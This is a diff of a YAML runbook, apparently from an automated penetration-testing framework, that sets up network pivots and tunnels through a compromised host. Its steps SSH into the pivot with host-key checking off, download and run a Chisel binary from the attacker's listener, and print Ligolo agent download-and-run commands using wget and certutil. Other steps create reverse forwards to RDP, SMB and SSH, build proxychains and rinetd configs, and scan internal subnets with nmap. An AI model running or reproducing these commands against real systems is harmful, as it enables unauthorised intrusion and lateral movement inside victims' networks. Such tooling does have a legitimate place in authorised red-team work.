@@ -1,287 +1,381 @@
-# v2 runbook — Pivoting & tunneling
-name: "Pivoting & Tunneling"
-description: "Establish network pivots and tunnels: Chisel, Ligolo-ng, SSH tunneling, SOCKS proxy, port forwarding, reverse port forwards"
-version: "2.0"
-
+name: Pivoting & Tunneling
+description: 'Establish network pivots and tunnels: Chisel, Ligolo-ng, SSH tunneling,
+  SOCKS proxy, port forwarding, reverse port forwards'
+version: '2.0'
 vars:
-  pivot_host: ""
-  pivot_user: ""
-  pivot_pass: ""
-  pivot_key: ""
-  listener_ip: ""
+  pivot_host: ''
+  pivot_user: ''
+  pivot_pass: ''
+  pivot_key: ''
+  listener_ip: ''
   listener_port: 11601
-  target_network: ""
+  target_network: ''
   ssh_port: 22
-
 steps:
-  - id: preamble
-    type: log
-    message: "Pivoting & tunneling — {pivot_host} → {target_network} (case: {case_id})"
+- id: preamble
+  type: log
+  message: 'Pivoting & tunneling — {pivot_host} → {target_network} (case: {case_id})'
+  name: Preamble
+- id: assess
+  name: Network architecture assessment
+  type: parallel
+  max_workers: 5
+  steps:
+  - id: ifconfig
+    name: Network interfaces on pivot
+    tool: ssh
+    args:
+    - -o
+    - StrictHostKeyChecking=no
+    - '{pivot_user}@{pivot_host}'
+    - ip addr 2>/dev/null || ifconfig
+    timeout: 30
+    save: '{case_dir}/pivot_interfaces.txt'
+    artifacts:
+    - '{case_dir}/pivot_interfaces.txt'
+    type: tool
+  - id: routing
+    name: Routing table
+    tool: ssh
+    args:
+    - -o
+    - StrictHostKeyChecking=no
+    - '{pivot_user}@{pivot_host}'
+    - route -n 2>/dev/null || netstat -rn
+    timeout: 30
+    save: '{case_dir}/pivot_routing.txt'
+    artifacts:
+    - '{case_dir}/pivot_routing.txt'
+    type: tool
+  - id: arp
+    name: ARP table
+    tool: ssh
+    args:
+    - -o
+    - StrictHostKeyChecking=no
+    - '{pivot_user}@{pivot_host}'
+    - arp -a 2>/dev/null || arp -n
+    timeout: 30
+    save: '{case_dir}/pivot_arp.txt'
+    type: tool
+  - id: netstat
+    name: Listening services
+    tool: ssh
+    args:
+    - -o
+    - StrictHostKeyChecking=no
+    - '{pivot_user}@{pivot_host}'
+    - ss -tlnp 2>/dev/null || netstat -ano
+    timeout: 30
+    save: '{case_dir}/pivot_listeners.txt'
+    type: tool
+  - id: dns_resolve
+    name: Internal DNS resolution
+    tool: ssh
+    args:
+    - -o
+    - StrictHostKeyChecking=no
+    - '{pivot_user}@{pivot_host}'
+    - cat /etc/resolv.conf 2>/dev/null; nslookup {target_network}.1 2>/dev/null ||
+      host {target_network}.1 2>/dev/null
+    timeout: 30
+    save: '{case_dir}/pivot_dns.txt'
+    type: tool
+- id: chisel
+  name: Chisel tunnel
+  type: sequential
+  steps:
+  - id: chisel_server
+    name: Start Chisel server (attacker side)
+    tool: chisel
+    args:
+    - server
+    - --port
+    - '{listener_port}'
+    - --socks5
+    - --pid
+    - '{case_dir}/chisel_server.pid'
+    timeout: 10
+    artifacts:
+    - '{case_dir}/chisel_server.pid'
+    type: tool
+  - id: chisel_client
+    name: Start Chisel client (pivot side)
+    tool: ssh
+    args:
+    - -o
+    - StrictHostKeyChecking=no
+    - '{pivot_user}@{pivot_host}'
+    - curl -s http://{listener_ip}:8080/chisel.exe -o /tmp/chisel.exe && chmod +x
+      /tmp/chisel.exe && /tmp/chisel.exe client {listener_ip}:{listener_port} R:socks
+    timeout: 30
+    save: '{case_dir}/chisel_client.log'
+    artifacts:
+    - '{case_dir}/chisel_client.log'
+    type: tool
+  - id: chisel_reverse
+    name: Chisel reverse port forwards
+    tool: chisel
+    args:
+    - client
+    - --pid
+    - '{case_dir}/chisel_reverse.pid'
+    - '{listener_ip}:{listener_port}'
+    - R:3389:{target_network}.10:3389
+    - R:445:{target_network}.10:445
+    - R:22:{target_network}.10:22
+    timeout: 30
+    when: has:target_network
+    type: tool
+- id: ligolo
+  name: Ligolo-ng tunnel
+  type: sequential
+  steps:
+  - id: ligolo_iface
+    name: Create ligolo interface
+    tool: bash
+    args:
+    - -c
+    - ip tuntap add user $(whoami) mode tun ligolo && ip link set ligolo up && ip
+      route add {target_network}/24 dev ligolo 2>/dev/null || echo 'Interface may
+      already exist'
+    timeout: 15
+    save: '{case_dir}/ligolo_iface_setup.txt'
+    artifacts:
+    - '{case_dir}/ligolo_iface_setup.txt'
+    type: tool
+  - id: ligolo_proxy
+    name: Start ligolo-ng proxy
+    tool: ligolo-proxy
+    args:
+    - -laddr
+    - 0.0.0.0:{listener_port}
+    - -autocert
+    - 'false'
+    - -pid
+    - '{case_dir}/ligolo_proxy.pid'
+    timeout: 10
+    artifacts:
+    - '{case_dir}/ligolo_proxy.pid'
+    type: tool
+  - id: ligolo_agent_cmd
+    name: Deploy ligolo agent (generate command)
+    tool: python3
+    args:
+    - -c
+    - 'print(''Ligolo agent deployment command:''); print(f''Linux: wget http://{listener_ip}:8080/ligolo-agent
+      -O /tmp/agent \&\& chmod +x /tmp/agent \&\& ./tmp/agent -connect {listener_ip}:{listener_port}
+      -ignore-cert''); print(f''Windows: certutil -urlcache -f http://{listener_ip}:8080/ligolo-agent.exe
+      agent.exe \&\& agent.exe -connect {listener_ip}:{listener_port} -ignore-cert'')'
+    timeout: 15
+    save: '{case_dir}/ligolo_agent_cmd.txt'
+    type: tool
+- id: ssh_tunnel
+  name: SSH tunneling
+  type: parallel
+  max_workers: 4
+  steps:
+  - id: ssh_dynamic
+    name: SSH dynamic SOCKS proxy
+    tool: ssh
+    args:
+    - -o
+    - StrictHostKeyChecking=no
+    - -D
+    - '1080'
+    - -N
+    - -f
+    - '{pivot_user}@{pivot_host}'
+    - -i
+    - '{pivot_key}'
+    timeout: 15
+    when: has:pivot_key
+    type: tool
+  - id: ssh_local
+    name: SSH local port forwards
+    tool: python3
+    args:
+    - -c
+    - ports=[(3389,'RDP'),(22,'SSH'),(80,'HTTP'),(443,'HTTPS'),(445,'SMB'),(389,'LDAP'),(636,'LDAPS'),(1433,'MSSQL'),(3306,'MySQL'),(5985,'WinRM'),(5986,'WinRM-S')];
+      target='{target_network}'.rsplit('.',1)[0]; subnet=target if target.split('.')[0].isdigit()
+      else '10.10.10'; print('SSH local port forwarding commands:'); [print(f'ssh
+      -L {p}:\"{subnet}.10:{p}\" {pivot_user}@{pivot_host} -N -f') for p,name in ports]
+    save: '{case_dir}/ssh_forward_cmds.txt'
+    timeout: 15
+    when: has:target_network
+    type: tool
+  - id: ssh_reverse
+    name: SSH reverse tunnel
+    tool: python3
+    args:
+    - -c
+    - print('SSH reverse port forwarding:'); print(f'ssh -R {listener_port}:localhost:22
+      {pivot_user}@{listener_ip} -N -f'); print(); print('Meterpreter reverse tunnel:');
+      print(f'ssh -R 4444:localhost:4444 {pivot_user}@{listener_ip} -N -f')
+    save: '{case_dir}/ssh_reverse_cmds.txt'
+    timeout: 15
+    type: tool
+- id: proxy_chain
+  name: SOCKS proxy chain
+  type: sequential
+  steps:
+  - id: proxychains_conf
+    name: Generate proxychains config
+    tool: python3
+    args:
+    - -c
+    - 'open(''{case_dir}/proxychains.conf'',''w'').write(''# Generated proxychains
+      config\nstrict_chain\ntcp_connect_timeout 8000\n[ProxyList]\n# 1: Chisel SOCKS\nsocks5
+      127.0.0.1 1080\n# 2: SSH dynamic\nsocks5 127.0.0.1 1081\n# 3: Ligolo\nsocks5
+      127.0.0.1 1082\n''); print(''proxychains.conf written - use: proxychains -f
+      {case_dir}/proxychains.conf <tool>'')'
+    timeout: 15
+    save: '{case_dir}/proxychains_conf.txt'
+    artifacts:
+    - '{case_dir}/proxychains.conf'
+    type: tool
+  - id: proxy_test
+    name: Test SOCKS chain
+    tool: proxychains
+    args:
+    - -f
+    - '{case_dir}/proxychains.conf'
+    - curl
+    - -s
+    - --max-time
+    - '10'
+    - http://{target_network}.1
+    timeout: 30
+    save: '{case_dir}/proxy_test.txt'
+    type: tool
+- id: portfwd
+  name: Static port forwarding
+  type: parallel
+  steps:
+  - id: socat_relay
+    name: Socat relay
+    tool: python3
+    args:
+    - -c
+    - print('Socat port forward:'); print(f'socat TCP-LISTEN:4444,fork TCP:{target_network}.10:3389');
+      print(); print('Windows netsh port forward:'); print(f'netsh interface portproxy
+      add v4tov4 listenport=4444 connectport=3389 connectaddress={target_network}.10')
+    save: '{case_dir}/portfwd_cmds.txt'
+    timeout: 15
+    type: tool
+  - id: rinetd_conf
+    name: RINetD config
+    tool: python3
+    args:
+    - -c
+    - 'open(''{case_dir}/rinetd.conf'',''w'').write(''# rinetd port forward config\n#
+      bind  bind_port  target  target_port\n0.0.0.0  3389  {target_network}.10  3389\n0.0.0.0  445   {target_network}.10  445\n0.0.0.0  22    {target_network}.10  22\n'');
+      print(''rinetd.conf written - use: rinetd -c {case_dir}/rinetd.conf'')'
+    save: '{case_dir}/rinetd_conf.txt'
+    timeout: 15
+    type: tool
+- id: ask_scan
+  type: prompt
+  message: Run internal network scan through pivot?
+  then:
+  - id: pivot_nmap
+    name: Nmap via proxychains
+    tool: proxychains
+    args:
+    - -f
+    - '{case_dir}/proxychains.conf'
+    - nmap
+    - -sT
+    - -Pn
+    - -n
+    - --top-ports
+    - '100'
+    - --max-retries
+    - '2'
+    - --min-rate
+    - '50'
+    - '{target_network}.0/24'
+    - -oN
+    - '{case_dir}/pivot_nmap.txt'
+    timeout: 600
+    artifacts:
+    - '{case_dir}/pivot_nmap.txt'
+    type: tool
+  - id: pivot_nbtscan
+    name: NetBIOS scan via pivot
+    tool: ssh
+    args:
+    - -o
+    - StrictHostKeyChecking=no
+    - '{pivot_user}@{pivot_host}'
+    - nbtscan {target_network}.0/24 2>/dev/null || echo 'nbtscan not found'
+    timeout: 120
+    save: '{case_dir}/pivot_nbtscan.txt'
+    type: tool
+  name: Ask Scan
+- id: report
+  name: Generate pivot & tunnel report
+  type: report
+  format: markdown
+  title: Pivoting & Tunneling — {pivot_host}
+  output: '{case_dir}/pivoting-report.md'
+  sections:
+  - heading: Target
+    body: '- Pivot host: {pivot_host}
 
-  # Phase 1: Connectivity & architecture assessment
-  - id: assess
-    name: "Network architecture assessment"
-    type: parallel
-    max_workers: 5
-    steps:
-      - id: ifconfig
-        name: "Network interfaces on pivot"
-        tool: ssh
-        args: ["-o", "StrictHostKeyChecking=no",
-               "{pivot_user}@{pivot_host}",
-               "ip addr 2>/dev/null || ifconfig",
-               "-o", "{case_dir}/pivot_interfaces.txt"]
-        timeout: 30
-        artifacts: ["{case_dir}/pivot_interfaces.txt"]
+      - Target network: {target_network}
 
-      - id: routing
-        name: "Routing table"
-        tool: ssh
-        args: ["-o", "StrictHostKeyChecking=no",
-               "{pivot_user}@{pivot_host}",
-               "route -n 2>/dev/null || netstat -rn",
-               "-o", "{case_dir}/pivot_routing.txt"]
-        timeout: 30
-        artifacts: ["{case_dir}/pivot_routing.txt"]
+      - Listener: {listener_ip}:{listener_port}'
+  - heading: Network Topology
+    body: '- Interfaces: {case_dir}/pivot_interfaces.txt
 
-      - id: arp
-        name: "ARP table"
-        tool: ssh
-        args: ["-o", "StrictHostKeyChecking=no",
-               "{pivot_user}@{pivot_host}",
-               "arp -a 2>/dev/null || arp -n",
-               "-o", "{case_dir}/pivot_arp.txt"]
-        timeout: 30
+      - Routes: {case_dir}/pivot_routing.txt
 
-      - id: netstat
-        name: "Listening services"
-        tool: ssh
-        args: ["-o", "StrictHostKeyChecking=no",
-               "{pivot_user}@{pivot_host}",
-               "ss -tlnp 2>/dev/null || netstat -ano",
-               "-o", "{case_dir}/pivot_listeners.txt"]
-        timeout: 30
+      - ARP: {case_dir}/pivot_arp.txt
 
-      - id: dns_resolve
-        name: "Internal DNS resolution"
-        tool: ssh
-        args: ["-o", "StrictHostKeyChecking=no",
-               "{pivot_user}@{pivot_host}",
-               "cat /etc/resolv.conf 2>/dev/null; nslookup {target_network}.1 2>/dev/null || host {target_network}.1 2>/dev/null",
-               "-o", "{case_dir}/pivot_dns.txt"]
-        timeout: 30
+      - Listeners: {case_dir}/pivot_listeners.txt'
+  - heading: Active Tunnels
+    body: '- Chisel: {case_dir}/chisel_client.log
 
-  # Phase 2: Chisel tunnel
-  - id: chisel
-    name: "Chisel tunnel"
-    type: sequential
-    steps:
-      - id: chisel_server
-        name: "Start Chisel server (attacker side)"
-        tool: chisel
-        args: ["server", "--port", "{listener_port}",
-               "--socks5",
-               "--pid", "{case_dir}/chisel_server.pid"]
-        timeout: 10
-        artifacts: ["{case_dir}/chisel_server.pid"]
+      - Ligolo: {case_dir}/ligolo_proxy.pid
 
-      - id: chisel_client
-        name: "Start Chisel client (pivot side)"
-        tool: ssh
-        args: ["-o", "StrictHostKeyChecking=no",
-               "{pivot_user}@{pivot_host}",
-               "curl -s http://{listener_ip}:8080/chisel.exe -o /tmp/chisel.exe && chmod +x /tmp/chisel.exe && /tmp/chisel.exe client {listener_ip}:{listener_port} R:socks",
-               "-o", "{case_dir}/chisel_client.log"]
-        timeout: 30
-        artifacts: ["{case_dir}/chisel_client.log"]
+      - SSH SOCKS: {case_dir}/ssh_socks.pid'
+  - heading: Proxy Chain
+    body: '- Config: {case_dir}/proxychains.conf
 
-      - id: chisel_reverse
-        name: "Chisel reverse port forwards"
-        tool: chisel
-        args: ["client", "--pid", "{case_dir}/chisel_reverse.pid",
-               "{listener_ip}:{listener_port}",
-               "R:3389:{target_network}.10:3389",
-               "R:445:{target_network}.10:445",
-               "R:22:{target_network}.10:22"]
-        timeout: 30
-        when: "has:target_network"
+      - Test: {case_dir}/proxy_test.txt'
+  - heading: Port Forwards
+    body: '- Socat/netsh: {case_dir}/portfwd_cmds.txt
 
-  # Phase 3: Ligolo-ng
-  - id: ligolo
-    name: "Ligolo-ng tunnel"
-    type: sequential
-    steps:
-      - id: ligolo_iface
-        name: "Create ligolo interface"
-        tool: bash
-        args: ["-c",
-               "ip tuntap add user $(whoami) mode tun ligolo && ip link set ligolo up && ip route add {target_network}/24 dev ligolo 2>/dev/null || echo 'Interface may already exist'",
-               "-o", "{case_dir}/ligolo_iface_setup.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/ligolo_iface_setup.txt"]
+      - RINetD: {case_dir}/rinetd.conf'
+  - heading: Pivot Scan Results
+    body: '- Nmap: {case_dir}/pivot_nmap.txt
 
-      - id: ligolo_proxy
-        name: "Start ligolo-ng proxy"
-        tool: ligolo-proxy
-        args: ["-laddr", "0.0.0.0:{listener_port}",
-               "-autocert", "false",
-               "-pid", "{case_dir}/ligolo_proxy.pid"]
-        timeout: 10
-        artifacts: ["{case_dir}/ligolo_proxy.pid"]
-
-      - id: ligolo_agent_cmd
-        name: "Deploy ligolo agent (generate command)"
-        tool: python3
-        args: ["-c",
-               "\"print('Ligolo agent deployment command:')\nprint(f'Linux: wget http://{listener_ip}:8080/ligolo-agent -O /tmp/agent && chmod +x /tmp/agent && ./tmp/agent -connect {listener_ip}:{listener_port} -ignore-cert')\nprint(f'Windows: certutil -urlcache -f http://{listener_ip}:8080/ligolo-agent.exe agent.exe && agent.exe -connect {listener_ip}:{listener_port} -ignore-cert')\"",
-               "-o", "{case_dir}/ligolo_agent_cmd.txt"]
-        timeout: 15
-
-  # Phase 4: SSH tunneling
-  - id: ssh_tunnel
-    name: "SSH tunneling"
-    type: parallel
-    max_workers: 4
-    steps:
-      - id: ssh_dynamic
-        name: "SSH dynamic SOCKS proxy"
-        tool: ssh
-        args: ["-o", "StrictHostKeyChecking=no",
-               "-D", "1080",
-               "-N", "-f",
-               "{pivot_user}@{pivot_host}",
-               "-i", "{pivot_key}",
-               "-o", "{case_dir}/ssh_socks.pid"]
-        timeout: 15
-        artifacts: ["{case_dir}/ssh_socks.pid"]
-        when: "has:pivot_key"
-
-      - id: ssh_local
-        name: "SSH local port forwards"
-        tool: python3
-        args: ["-c",
-               "\"ports=[(3389,'RDP'),(22,'SSH'),(80,'HTTP'),(443,'HTTPS'),(445,'SMB'),(389,'LDAP'),(636,'LDAPS'),(1433,'MSSQL'),(3306,'MySQL'),(5985,'WinRM'),(5986,'WinRM-S')];\nprint('SSH local port forwarding commands:');\ntarget='{target_network}'.rsplit('.',1)[0];\nsubnet=target if target.split('.')[0].isdigit() else '10.10.10';\nfor p,name in ports:\n print(f'ssh -L {p}:\"{{{subnet}}}.10:{p}\" {{{{pivot_user}}}}@{{{{pivot_host}}}} -N -f')\n\"",
-               "-o", "{case_dir}/ssh_forward_cmds.txt"]
-        timeout: 15
-        when: "has:target_network"
-
-      - id: ssh_reverse
-        name: "SSH reverse tunnel"
-        tool: python3
-        args: ["-c",
-               "\"print('SSH reverse port forwarding:')\nprint(f'ssh -R {listener_port}:localhost:22 {pivot_user}@{listener_ip} -N -f')\nprint()\nprint('Meterpreter reverse tunnel:')\nprint(f'ssh -R 4444:localhost:4444 {pivot_user}@{listener_ip} -N -f')\"",
-               "-o", "{case_dir}/ssh_reverse_cmds.txt"]
-        timeout: 15
-
-  # Phase 5: SOCKS proxy chain
-  - id: proxy_chain
-    name: "SOCKS proxy chain"
-    type: sequential
-    steps:
-      - id: proxychains_conf
-        name: "Generate proxychains config"
-        tool: python3
-        args: ["-c",
-               "\"conf='''# Generated proxychains config\nstrict_chain\ntcp_connect_timeout 8000\n[ProxyList]\n# 1: Chisel SOCKS\nsocks5 127.0.0.1 1080\n# 2: SSH dynamic\nsocks5 127.0.0.1 1081\n# 3: Ligolo\nsocks5 127.0.0.1 1082\n'''\nopen('{case_dir}/proxychains.conf','w').write(conf)\nprint('proxychains.conf written - use: proxychains -f {case_dir}/proxychains.conf <tool>')\"",
-               "-o", "{case_dir}/proxychains.conf"]
-        timeout: 15
-        artifacts: ["{case_dir}/proxychains.conf"]
-
-      - id: proxy_test
-        name: "Test SOCKS chain"
-        tool: proxychains
-        args: ["-f", "{case_dir}/proxychains.conf",
-               "curl", "-s", "--max-time", "10",
-               "'http://{target_network}.1'",
-               "-o", "{case_dir}/proxy_test.txt"]
-        timeout: 30
-
-  # Phase 6: Port forwarding (static)
-  - id: portfwd
-    name: "Static port forwarding"
-    type: parallel
-    steps:
-      - id: socat_relay
-        name: "Socat relay"
-        tool: python3
-        args: ["-c",
-               "\"print('Socat port forward:')\nprint(f'socat TCP-LISTEN:4444,fork TCP:{target_network}.10:3389')\nprint()\nprint('Windows netsh port forward:')\nprint(f'netsh interface portproxy add v4tov4 listenport=4444 connectport=3389 connectaddress={target_network}.10')\"",
-               "-o", "{case_dir}/portfwd_cmds.txt"]
-        timeout: 15
-
-      - id: rinetd_conf
-        name: "RINetD config"
-        tool: python3
-        args: ["-c",
-               "\"conf='''# rinetd port forward config\n# bind  bind_port  target  target_port\n0.0.0.0  3389  {target_network}.10  3389\n0.0.0.0  445   {target_network}.10  445\n0.0.0.0  22    {target_network}.10  22\n'''\nopen('{case_dir}/rinetd.conf','w').write(conf)\nprint('rinetd.conf written - use: rinetd -c {case_dir}/rinetd.conf')\"",
-               "-o", "{case_dir}/rinetd.conf"]
-        timeout: 15
-
-  # Phase 7: Internal scanning via pivot
-  - id: ask_scan
-    type: prompt
-    message: "Run internal network scan through pivot?"
-    then:
-      - id: pivot_nmap
-        name: "Nmap via proxychains"
-        tool: proxychains
-        args: ["-f", "{case_dir}/proxychains.conf",
-               "nmap", "-sT", "-Pn", "-n",
-               "--top-ports", "100",
-               "--max-retries", "2",
-               "--min-rate", "50",
-               "{target_network}.0/24",
-               "-o", "{case_dir}/pivot_nmap.txt"]
-        timeout: 600
-        artifacts: ["{case_dir}/pivot_nmap.txt"]
-
-      - id: pivot_nbtscan
-        name: "NetBIOS scan via pivot"
-        tool: ssh
-        args: ["-o", "StrictHostKeyChecking=no",
-               "{pivot_user}@{pivot_host}",
-               "nbtscan {target_network}.0/24 2>/dev/null || echo 'nbtscan not found'",
-               "-o", "{case_dir}/pivot_nbtscan.txt"]
-        timeout: 120
-
-  # Phase 8: Report
-  - id: report
-    name: "Generate pivot & tunnel report"
-    type: report
-    format: markdown
-    title: "Pivoting & Tunneling — {pivot_host}"
-    output: "{case_dir}/pivoting-report.md"
-    sections:
-      - heading: "Target"
-        body: "- Pivot host: {pivot_host}\n- Target network: {target_network}\n- Listener: {listener_ip}:{listener_port}"
-      - heading: "Network Topology"
-        body: "- Interfaces: {case_dir}/pivot_interfaces.txt\n- Routes: {case_dir}/pivot_routing.txt\n- ARP: {case_dir}/pivot_arp.txt\n- Listeners: {case_dir}/pivot_listeners.txt"
-      - heading: "Active Tunnels"
-        body: "- Chisel: {case_dir}/chisel_client.log\n- Ligolo: {case_dir}/ligolo_proxy.pid\n- SSH SOCKS: {case_dir}/ssh_socks.pid"
-      - heading: "Proxy Chain"
-        body: "- Config: {case_dir}/proxychains.conf\n- Test: {case_dir}/proxy_test.txt"
-      - heading: "Port Forwards"
-        body: "- Socat/netsh: {case_dir}/portfwd_cmds.txt\n- RINetD: {case_dir}/rinetd.conf"
-      - heading: "Pivot Scan Results"
-        body: "- Nmap: {case_dir}/pivot_nmap.txt\n- NetBIOS: {case_dir}/pivot_nbtscan.txt"
-
+      - NetBIOS: {case_dir}/pivot_nbtscan.txt'
 postflight:
-  - id: cleanup
-    type: parallel
-    steps:
-      - id: kill_chisel
-        name: "Kill chisel server"
-        tool: bash
-        args: ["-c", "kill $(cat {case_dir}/chisel_server.pid 2>/dev/null) 2>/dev/null || true"]
-        timeout: 5
-
-      - id: kill_ligolo
-        name: "Kill ligolo proxy"
-        tool: bash
-        args: ["-c", "kill $(cat {case_dir}/ligolo_proxy.pid 2>/dev/null) 2>/dev/null || true"]
-        timeout: 5
-
-      - id: done
-        type: notify
-        level: info
-        message: "Pivoting complete — tunnels active in {case_dir}. Cleanup on runbook end."
+- id: cleanup
+  type: parallel
+  steps:
+  - id: kill_chisel
+    name: Kill chisel server
+    tool: bash
+    args:
+    - -c
+    - kill $(cat {case_dir}/chisel_server.pid 2>/dev/null) 2>/dev/null || true
+    timeout: 5
+    type: tool
+  - id: kill_ligolo
+    name: Kill ligolo proxy
+    tool: bash
+    args:
+    - -c
+    - kill $(cat {case_dir}/ligolo_proxy.pid 2>/dev/null) 2>/dev/null || true
+    timeout: 5
+    type: tool
+  - id: done
+    type: notify
+    level: info
+    message: Pivoting complete — tunnels active in {case_dir}. Cleanup on runbook
+      end.
+    name: Done
+  name: Cleanup
